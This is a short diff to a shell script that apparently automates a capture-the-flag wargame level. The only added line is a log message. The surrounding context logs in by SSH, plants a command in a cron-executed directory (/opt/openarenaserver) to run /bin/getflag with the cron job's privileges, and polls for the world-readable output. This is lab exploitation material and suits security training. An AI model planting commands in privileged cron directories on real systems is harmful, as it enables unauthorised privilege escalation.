@@ -126,6 +126,7 @@ main() {
 
     init_ssh_socket "$level05_socket_path" "$host" "$port" "$level05_username" "$level05_password";
     ssh_exec_via_socket "$level05_socket_path" "$host" "$port" "$level05_username" "echo \"/bin/getflag > /tmp/checkflag.txt; chmod 777 /tmp/checkflag.txt\" > /opt/openarenaserver/getflag.sh;";
+    log "This might take up to 2,5 minutes... We are waiting for the cron to expose the checkflag."
     checkflag=$(ssh_exec_via_socket "$level05_socket_path" "$host" "$port" "$level05_username" "while [ ! -e /tmp/checkflag.txt ]; do sleep 0.5; done; cat /tmp/checkflag.txt;" | head -n 1 | awk '{ print $NF }');
     close_ssh_socket "$level05_socket_path" "$host" "$port" "$level05_username";
 
